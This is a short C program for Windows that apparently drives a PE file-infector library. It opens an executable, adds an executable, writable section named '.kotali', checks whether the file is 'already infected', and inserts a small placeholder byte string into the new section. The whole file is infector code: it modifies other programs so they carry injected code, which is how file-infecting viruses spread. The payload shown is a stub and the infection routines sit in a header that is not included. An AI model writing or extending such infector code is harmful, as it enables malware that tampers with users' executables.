#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include "p32_infect.h"

/* run this program using the console pauser or add your own getch, system("pause") or input loop */

int main(int argc, char *argv[]) {
	
	P32_HNDS p32Hnds = {NULL,P32_NO_ERROR,0,0,NULL};
	         p32Hnds.hFile = p32_openFile("F:\\P32C\\calc12.exe");
	        
	if((p32Hnds.hFile != INVALID_HANDLE_VALUE) && (p32Hnds.hFile != NULL)) {
		
		fputs("[*]. File opened (ok)\r\n",stdout);
		
		DWORD success = p32_addNewSection(&p32Hnds,".kotali",0xE00000E0,1024);
		if(success != P32_NO_ERROR) {
		   switch(success) {
		   	      case P32_READFILE_ERROR:
		   	      break;
		   	      case P32_ALREADY_INFECT_ERROR:
		   	           fputs("[x]. File already infected\r\n",stdout);	
		   	      break;
		   }	
		} else {
		       fputs("[*]. Section added (ok)\r\n",stdout);
			   if(p32_insertCode(p32Hnds.hFile,p32Hnds.nSection,"\xcc\xee\x41\x42",4)) {
			   	  fputs("[*]. Code inserted in new Section (ok)\r\n",stdout);
			   } else {
			   	  fputs("[x]. Code insertion (fail)\r\n",stdout);
			   }		
		}
		p32_closeFile(p32Hnds.hFile);
		fputs("[*]. Closing file (ok)\r\n",stdout);
	}
	
	return 0;
}
